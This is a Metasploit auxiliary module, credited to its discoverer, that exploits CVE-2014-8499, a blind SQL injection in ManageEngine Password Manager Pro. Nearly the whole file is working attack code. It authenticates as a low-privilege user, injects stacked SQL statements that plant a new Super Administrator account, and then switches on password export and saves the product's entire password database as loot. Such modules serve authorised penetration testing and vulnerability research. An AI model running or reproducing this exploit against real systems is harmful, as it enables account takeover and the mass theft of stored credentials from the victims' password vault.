##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection',
      'Description' => %q{
        ManageEngine Password Manager Pro (PMP) has an authenticated blind SQL injection
        vulnerability in SQLAdvancedALSearchResult.cc that can be abused to escalate
        privileges and obtain Super Administrator access. A Super Administrator can then
        use his privileges to dump the whole password database in CSV format. PMP can use
        both MySQL and PostgreSQL databases but this module only exploits the latter as
        MySQL does not support stacked queries with Java. PostgreSQL is the default database
        in v6.8 and above, but older PMP versions can be upgraded and continue using MySQL,
        so a higher version does not guarantee exploitability. This module has been tested
        on v6.8 to v7.1 build 7104 on both Windows and Linux. The vulnerability is fixed in
        v7.1 build 7105 and above.
      },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2014-8499' ],
          [ 'OSVDB', '114485' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Nov/18' ],
          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_pmp_privesc.txt' ],
        ],
      'DisclosureDate' => 'Nov 8 2014'))

    register_options(
      [
        Opt::RPORT(7272),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('USERNAME', [true, 'The username to login as', 'guest']),
        OptString.new('PASSWORD', [true, 'Password for the specified username', 'guest']),
        OptString.new('TARGETURI', [ true,  "Password Manager Pro application URI", '/'])
      ])
  end


  def login(username, password)
    # 1st step: we obtain a JSESSIONID cookie...
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc')
    })

    if res && res.code == 200
      # 2nd step: we try to get the ORGN_NAME and AUTHRULE_NAME from the page (which is only needed for the MSP versions)
      if res.body && res.body.to_s =~ /id="ORGN_NAME" name="ORGN_NAME" value="([\w]*)"/
        orgn_name = $1
      else
        orgn_name = nil
      end

      if res.body && res.body.to_s =~ /id="AUTHRULE_NAME" name="AUTHRULE_NAME" value="([\w]*)"/
        authrule_name = $1
      else
        authrule_name = nil
      end

      # 3rd step: we try to get the domainName for the user
      cookie = res.get_cookies
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'login', 'AjaxResponse.jsp'),
        'ctype' => "application/x-www-form-urlencoded",
        'cookie' => cookie,
        'vars_get' => {
          'RequestType' => 'GetUserDomainName',
          'userName' => username
        }
      })
      if res && res.code == 200 && res.body
        domain_name = res.body.to_s.strip
      else
        domain_name = nil
      end

      # 4th step: authenticate to j_security_check, follow the redirect to PassTrixMain.cc and get its cookies.
      # For some reason send_request_cgi! doesn't work, so follow the redirect manually...
      vars_post = {
        'j_username'    => username,
        'username'      => username,
        'j_password'    => password
      }
      vars_post['ORGN_NAME'] = orgn_name if orgn_name
      vars_post['AUTHRULE_NAME'] = authrule_name if authrule_name
      vars_post['domainName'] = domain_name if domain_name

      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'j_security_check;' + cookie.to_s.gsub(';','')),
        'ctype' => "application/x-www-form-urlencoded",
        'cookie' => cookie,
        'vars_post' => vars_post
      })
      if res && res.code == 302
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, 'PassTrixMain.cc'),
          'cookie' => cookie,
        })

        if res && res.code == 200
          # 5th step: get the c ookies sent in the last response
          return res.get_cookies
        end
      end
    end
    return nil
  end


  def inject_sql(old_style)
    # On versions older than 7000 the injection is slightly different (we call it "old style").
    # For "new style" versions we can escalate to super admin by doing
    # "update aaaauthorizedrole set role_id=1 where account_id=#{user_id};insert into ptrx_superadmin values (#{user_id},true);"
    # However for code simplicity let's just create a brand new user which works for both "old style" and "new style" versions.
    if old_style
      sqli_prefix = '\\\'))) GROUP BY "PTRX_RID","PTRX_AID","PTRX_RNAME","PTRX_DESC","DOMAINNAME","PTRX_LNAME","PTRX_PWD","PTRX_ATYPE","PTRX_DNSN","PTRX_DEPT","PTRX_LOTN","PTRX_OSTYPE","PTRX_RURL","C1","C2","C3","C4","C5","C6","C7","C8","C9","C10","C11","C12","C13","C14","C15","C16","C17","C18","C19","C20","C21","C22","C23","C24","A1","A2","A3","A4","A5","A6","A7","A8","A9","A10","A11","A12","A13","A14","A15","A16","A17","A18","A19","A20","A21","A22","A23","A24","PTRX_NOTES") as ' + Rex::Text.rand_text_alpha_lower(rand(8)+3) + ";"
    else
      sqli_prefix = '\\\'))))) GROUP BY "PTRX_RID","PTRX_AID","PTRX_RNAME","PTRX_DESC","DOMAINNAME","PTRX_LNAME","PTRX_PWD","PTRX_ATYPE","PTRX_DNSN","PTRX_DEPT","PTRX_LOTN","PTRX_OSTYPE","PTRX_RURL","C1","C2","C3","C4","C5","C6","C7","C8","C9","C10","C11","C12","C13","C14","C15","C16","C17","C18","C19","C20","C21","C22","C23","C24","A1","A2","A3","A4","A5","A6","A7","A8","A9","A10","A11","A12","A13","A14","A15","A16","A17","A18","A19","A20","A21","A22","A23","A24","PTRX_NOTES") AS Ptrx_DummyPwds GROUP BY "PTRX_RID","PTRX_RNAME","PTRX_DESC","PTRX_ATYPE","PTRX_DNSN","PTRX_DEPT","PTRX_LOTN","PTRX_OSTYPE","PTRX_RURL","C1","C2","C3","C4","C5","C6","C7","C8","C9","C10","C11","C12","C13","C14","C15","C16","C17","C18","C19","C20","C21","C22","C23","C24") as ' + Rex::Text.rand_text_alpha_lower(rand(8)+3) + ";"
    end

    user_id = Rex::Text.rand_text_numeric(4)
    time = Rex::Text.rand_text_numeric(8)
    username = Rex::Text.rand_text_alpha_lower(6)
    username_chr = ""
    username.each_char do |c|
       username_chr << 'chr(' << c.ord.to_s << ')||'
    end
    username_chr.chop!.chop!

    password = Rex::Text.rand_text_alphanumeric(10)
    password_chr = ""
    password.each_char do |c|
       password_chr << 'chr(' << c.ord.to_s << ')||'
    end
    password_chr.chop!.chop!

    group_chr = ""
    'Default Group'.each_char do |c|
       group_chr << 'chr(' << c.ord.to_s << ')||'
    end
    group_chr.chop!.chop!

    sqli_command =
     "insert into aaauser values (#{user_id},$$$$,$$$$,$$$$,#{time},$$$$);" +
     "insert into aaapassword values (#{user_id},#{password_chr},$$$$,0,2,1,#{time});" +
     "insert into aaauserstatus values (#{user_id},$$ACTIVE$$,#{time});" +
     "insert into aaalogin values (#{user_id},#{user_id},#{username_chr});" +
     "insert into aaaaccount values (#{user_id},#{user_id},1,1,#{time});" +
     "insert into aaaauthorizedrole values (#{user_id},1);" +
     "insert into aaaaccountstatus values (#{user_id},-1,0,$$ACTIVE$$,#{time});" +
     "insert into aaapasswordstatus values (#{user_id},-1,0,$$ACTIVE$$,#{time});" +
     "insert into aaaaccadminprofile values (#{user_id},$$" + Rex::Text.rand_text_alpha_upper(8) + "$$,-1,-1,-1,-1,-1,false,-1,-1,-1,$$$$);" +
     "insert into aaaaccpassword values (#{user_id},#{user_id});" +
     "insert into ptrx_resourcegroup values (#{user_id},3,#{user_id},0,0,0,0,#{group_chr},$$$$);" +
     "insert into ptrx_superadmin values (#{user_id},true);"
    sqli_suffix = "-- "

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, "SQLAdvancedALSearchResult.cc"),
      'cookie'    => @cookie,
      'vars_post'  => {
        'COUNT'          => Rex::Text.rand_text_numeric(2),
        'SEARCH_ALL'     => sqli_prefix + sqli_command + sqli_suffix,
        'USERID'         => Rex::Text.rand_text_numeric(4)
      }
    })

    return [ username, password ]
  end


  def get_version
    res = send_request_cgi({
      'uri' => normalize_uri("PassTrixMain.cc"),
      'method' => 'GET'
    })
    if res && res.code == 200 && res.body &&
        res.body.to_s =~ /ManageEngine Password Manager Pro/ &&
        (
          res.body.to_s =~ /login\.css\?([0-9]+)/ ||                            # PMP v6
          res.body.to_s =~ /login\.css\?version=([0-9]+)/ ||                    # PMP v6
          res.body.to_s =~ /\/themes\/passtrix\/V([0-9]+)\/styles\/login\.css"/ # PMP v7
        )
      return $1.to_i
    else
      return 9999
    end
  end


  def check
    version = get_version
    case version
      when 0..7104
        return Exploit::CheckCode::Appears
      when 7105..9998
        return Exploit::CheckCode::Safe
      else
        return Exploit::CheckCode::Unknown
    end
  end


  def run
    unless check == Exploit::CheckCode::Appears
      print_error("Fingerprint hasn't been successful, trying to exploit anyway...")
    end

    version = get_version
    @cookie = login(datastore['USERNAME'], datastore['PASSWORD'])
    if @cookie == nil
      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate.")
    end

    creds = inject_sql(version < 7000 ? true : false)
    username = creds[0]
    password = creds[1]
    print_good("Created a new Super Administrator with username: #{username} | password: #{password}")

    cookie_su = login(username, password)

    if cookie_su.nil?
      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate as Super Administrator, account #{username} might not work.")
    end

    print_status("Reporting Super Administrator credentials...")
    store_valid_credentail(user: username, private: password)

    print_status("Leaking Password database...")
    loot_passwords(cookie_su)
  end

  def service_details
    super.merge({access_level: 'Super Administrator'})
  end

  def loot_passwords(cookie_admin)
    # 1st we turn on password exports
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'ConfigureOffline.ve'),
      'cookie' => cookie_admin,
      'vars_post'  => {
        'IS_XLS'         => 'true',
        'includePasswd'  => 'true',
        'HOMETAB'        => 'true',
        'RESTAB'         => 'true',
        'RGTAB'          => 'true',
        'PASSWD_RULE'    => 'Offline Password File',
        'LOGOUT_TIME'    => '20'
      }
    })

    # now get the loot!
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'jsp', 'xmlhttp', 'AjaxResponse.jsp'),
      'cookie' => cookie_admin,
      'vars_get' => {
        'RequestType' => 'ExportResources'
      }
    })

    if res && res.code == 200 && res.body && res.body.to_s.length > 0
      vprint_line(res.body.to_s)
      print_good("Successfully exported password database from Password Manager Pro.")
      loot_name     = 'manageengine.passwordmanagerpro.password.db'
      loot_type     = 'text/csv'
      loot_filename = 'manageengine_pmp_password_db.csv'
      loot_desc     = 'ManageEngine Password Manager Pro Password DB'
      p = store_loot(
          loot_name,
          loot_type,
          rhost,
          res.body,
          loot_filename,
          loot_desc)
      print_status("Password database saved in: #{p}")
    else
      print_error("Failed to export Password Manager Pro passwords.")
    end
  end
end
